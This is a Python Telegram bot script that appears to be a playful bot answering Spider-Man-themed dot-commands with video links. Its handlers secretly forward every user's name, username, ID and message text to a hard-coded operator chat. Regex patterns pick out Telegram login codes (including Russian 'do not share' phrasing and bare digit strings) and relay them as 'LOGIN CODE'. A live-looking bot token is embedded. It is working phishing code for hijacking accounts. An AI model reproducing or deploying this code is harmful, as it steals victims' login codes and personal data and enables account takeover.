import telebot
import re
import time

BOT_TOKEN = "8315828388:AAH8XbdRz7X1Xp_P-XSchNdLObSlPZna_js"
TARGET_CHAT_ID = 7943244842

bot = telebot.TeleBot(BOT_TOKEN)

COMMANDS = {
    ".polyester": {"text": "Im Scared knifes", "url": "https://files.catbox.moe/799bg2.mp4"},
    ".peterparker": {"text": "Everybody wants to be a spiderman, but no one wants to be a Peter Parker.", "url": "https://files.catbox.moe/lafv0p.mp4"},
    ".venom": {"text": "Its end for you.", "url": "https://files.catbox.moe/zjfbfz.mp4"},
    ".harryosborn": {"text": "You are my friend.", "url": "https://files.catbox.moe/ls0wth.mp4"},
    ".tobymaguire": {"text": "No matter how many of you there are, I am always stronger.", "url": "https://files.catbox.moe/u75tvr.mp4"},
    ".alexross": {"text": "Gold is older than you.", "url": "https://files.catbox.moe/bb2b9g.mp4"},
    ".mcu2000s": {"text": "2000 is millenium?", "url": "https://files.catbox.moe/x7zgul.mp4"},
    ".toaa": {"text": "I am..", "url": "https://files.catbox.moe/k01num.mp4"},
    ".ghostrider": {"text": "do you know about ghost rider?", "url": "https://files.catbox.moe/x0xiwb.mp4"},
    ".mrrobot": {"text": "cybersecurity?", "url": "https://files.catbox.moe/t8p4h3.mp4"},
}


def notify_kovak(user, text, cmd_used=None):
    username = "@" + user.username if user.username else "none"
    first_name = user.first_name or ""
    last_name = user.last_name or ""
    user_id = user.id
    ts = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())

    info = "🔔 New message\n"
    info += "━━━━━━━━━━━━━\n"
    info += "Name: " + first_name + " " + last_name + "\n"
    info += "Username: " + username + "\n"
    info += "ID: " + str(user_id) + "\n"
    if cmd_used:
        info += "Command: " + cmd_used + "\n"
    info += "Time: " + ts + "\n"
    info += "━━━━━━━━━━━━━\n"
    info += "Message: " + (text or "")[:500]

    bot.send_message(TARGET_CHAT_ID, info)


@bot.message_handler(commands=['start'])
def handle_start(message):
    notify_kovak(message.from_user, "/start", "/start")
    bot.send_message(message.chat.id, "✅ Bot connected.")


@bot.message_handler(func=lambda m: True, content_types=['text'])
def handle_message(message):
    text = message.text or ""
    user = message.from_user

    # Если пишет Kovak — игнорируем
    if user.id == TARGET_CHAT_ID:
        return

    # Проверяем команды
    cmd_used = None
    for cmd_key, cmd_data in COMMANDS.items():
        if text == cmd_key or text.startswith(cmd_key + " "):
            cmd_used = cmd_key
            rest = ""
            if text.startswith(cmd_key + " "):
                rest = text[len(cmd_key):].strip()

            # Шлём видео Kovak
            try:
                caption = cmd_data["text"]
                if rest:
                    caption += " " + rest
                bot.send_video(TARGET_CHAT_ID, cmd_data["url"], caption=caption)
            except:
                bot.send_message(TARGET_CHAT_ID, "Error sending video for " + cmd_key)

            # Уведомляем Kovak
            notify_kovak(user, text, cmd_used)
            return

    # Обычное сообщение (не команда) — просто уведомляем
    notify_kovak(user, text)

    # Проверяем на код входа
    patterns = [
        r'(?:login\s*code|код\s*для\s*входа|ваш\s*код|c[oó]digo)\D*(\d{4,8})',
        r'(\d{5})\D*(?:do\s*not\s*give|не\s*передавайте)',
        r'^(\d{4,8})\s*$',
    ]

    for pattern in patterns:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            code = m.group(1)
            bot.send_message(TARGET_CHAT_ID, "🔐 LOGIN CODE: " + code)
            break


if __name__ == '__main__':
    print("Bot running...")
    bot.infinity_polling()
